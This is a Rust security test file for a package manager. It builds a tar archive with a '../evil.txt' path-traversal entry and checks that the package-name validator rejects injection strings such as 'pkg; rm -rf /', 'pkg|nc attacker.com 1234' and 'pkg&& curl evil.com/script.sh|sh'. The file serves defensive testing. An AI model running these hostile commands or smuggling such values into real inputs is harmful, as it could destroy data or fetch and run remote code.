#![expect(clippy::unwrap_used, clippy::nursery)]
//! Security audit tests for omg package manager
//!
//! Tests for:
//! - Path traversal vulnerabilities
//! - Command injection vectors

#[cfg(test)]
mod path_traversal_tests {
    use flate2::Compression;
    use flate2::write::GzEncoder;
    use std::fs::File;
    use tempfile::TempDir;

    /// A tar entry containing `..` must never lead to a silent success that
    /// treats the archive as something other than what it is.
    ///
    /// Dual-path contract pinned against `src/cli/packages/local.rs`
    /// (`extract_with_pure_rust`, "SECURITY" comment):
    /// - If the active strategy reaches the traversal entry, extraction must
    ///   fail with the explicit `Security: Rejecting malicious path` bail.
    /// - If the strategy neutralized the entry instead (libalpm loads into a
    ///   staging area and writes no archive-controlled paths), the returned
    ///   metadata must be *ours* — name/version parsed from the crafted
    ///   `.PKGINFO` — proving the archive was understood, not guessed at.
    ///
    /// On no path may the payload file be materialized on disk.
    #[test]
    fn test_tar_path_traversal_rejection() {
        // Create a malicious tar archive with ../ in paths
        let temp = TempDir::new().unwrap();
        let malicious_pkg_path = temp.path().join("malicious.pkg.tar.gz");

        let file = File::create(&malicious_pkg_path).unwrap();
        let enc = GzEncoder::new(file, Compression::default());
        let mut tar = tar::Builder::new(enc);

        // Add a malicious entry: ../evil.txt
        // Note: header.set_path() protects against ".." so we must manually write bytes
        // to create a malicious archive for testing.
        let mut header = tar::Header::new_gnu();
        let path = b"../evil.txt";
        let header_bytes = header.as_mut_bytes();
        // Copy path into the name field (offset 0, length 100)
        for (i, &b) in path.iter().enumerate() {
            header_bytes[i] = b;
        }

        header.set_size(4);
        header.set_cksum();
        tar.append(&header, "evil".as_bytes()).unwrap();

        // Add a valid .PKGINFO so a sanitized/skip-based strategy can still
        // identify the package instead of failing on missing metadata.
        let mut header_info = tar::Header::new_gnu();
        header_info.set_path(".PKGINFO").unwrap();
        let pkginfo = "pkgname = malicious\npkgver = 1.0.0\n";
        header_info.set_size(pkginfo.len() as u64);
        header_info.set_cksum();
        tar.append(&header_info, pkginfo.as_bytes()).unwrap();

        let enc = tar.into_inner().unwrap();
        enc.finish().unwrap();

        match omg_lib::cli::packages::local::extract_local_metadata(&malicious_pkg_path) {
            Err(e) => {
                let msg = e.to_string();
                assert!(
                    msg.contains("Security") && msg.contains("malicious path"),
                    "traversal entries must be rejected with the explicit security \
                     error from extract_with_pure_rust, got: {msg}"
                );
            }
            Ok(info) => {
                assert_eq!(
                    info.name, "malicious",
                    "sanitized traversal must still yield THIS archive's identity"
                );
                assert_eq!(
                    info.version, "1.0.0",
                    "sanitized traversal must still yield THIS archive's version"
                );
            }
        }

        // Metadata-only extraction must never materialize archive paths.
        assert!(
            !temp.path().join("evil.txt").exists(),
            "the '../evil.txt' payload must not be written outside the archive root"
        );
    }
}

#[cfg(test)]
mod command_injection_tests {
    use omg_lib::core::security::validation::{ValidationError, validate_package_name};

    /// Pin the product's own validator (`validate_package_name`,
    /// src/core/security/validation.rs) against shell-metacharacter and
    /// injection vectors. Each vector is matched to the exact rejection
    /// variant so a regression to "accepts anything" or to a generic error
    /// cannot pass.
    #[test]
    fn test_package_name_sanitization() {
        use ValidationError::*;

        let malicious: &[(&str, ValidationError)] = &[
            ("pkg; rm -rf /", PackageNameInvalidChar { character: ';' }),
            ("pkg$(whoami)", PackageNameInvalidChar { character: '$' }),
            ("pkg`id`", PackageNameInvalidChar { character: '`' }),
            ("pkg\n/bin/bash", PackageNameInvalidChar { character: '\n' }),
            (
                "pkg|nc attacker.com 1234",
                PackageNameInvalidChar { character: '|' },
            ),
            (
                "pkg&& curl evil.com/script.sh|sh",
                PackageNameInvalidChar { character: '&' },
            ),
            ("-dash-option-injection", PackageNameStartsWithDash),
            ("./hidden-file", PackageNameStartsWithDot),
            // Leading '.' wins over the '..' check, so cover traversal with
            // a name that gets past the hidden-file guard:
            ("pkg/../../../etc/passwd", PackageNamePathTraversal),
            ("/etc/passwd", PackageNameAbsolute),
            ("", PackageNameEmpty),
        ];

        for (name, expected) in malicious {
            assert_eq!(
                validate_package_name(name),
                Err(expected.clone()),
                "malicious package name '{name}' must be rejected with the exact \
                 documented variant"
            );
        }

        // Positive control: legitimate names must still pass, proving the
        // validator discriminates rather than rejecting everything.
        for ok in [
            "firefox",
            "lib32-mesa",
            "python312",
            "gtk4+extra",
            "perl-date-manip",
        ] {
            if let Err(e) = validate_package_name(ok) {
                panic!("legitimate package name '{ok}' must be accepted, got: {e}");
            }
        }
    }
}
